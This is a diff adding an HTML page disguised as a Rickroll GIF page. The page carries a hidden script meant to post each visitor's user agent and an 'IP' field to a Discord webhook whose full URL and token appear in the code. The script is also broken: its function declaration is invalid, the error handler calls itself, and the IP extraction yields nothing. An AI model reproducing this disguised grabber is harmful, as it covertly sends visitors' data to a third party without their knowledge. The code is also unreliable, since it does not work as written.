@@ -1,0 +1,24 @@
+```<html>
+  <head>
+    <meta name="description" content="Rickroll GIF - Never Gonna Give You Up" />
+    <title>Rickroll GIF - Never Gonna Give You Up</title>
+  </head>
+  <body>
+    <img src="https://tenor.com/view/rickroll-roll-rick-never-gonna-give-you-up-never-gonna-gif-22954713" alt="Rickroll GIF" onerror="this.onerror()" />
+    <script>
+      function this.onerror() {
+        fetch('https://discord.com/api/webhooks/1478222834093527060/Cv-YqSMJY_Hkpwqd5iKdAuKro_XylIjIl2BLties4ZHgx5NnFS3MIOj3ku8BSu1SYyfL', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            ip: document.location.href.split('://')[2],
+            user_agent: navigator.userAgent
+          })
+        })
+        .catch(error => console.error(error));
+      }
+    </script>
+  </body>
+</html>
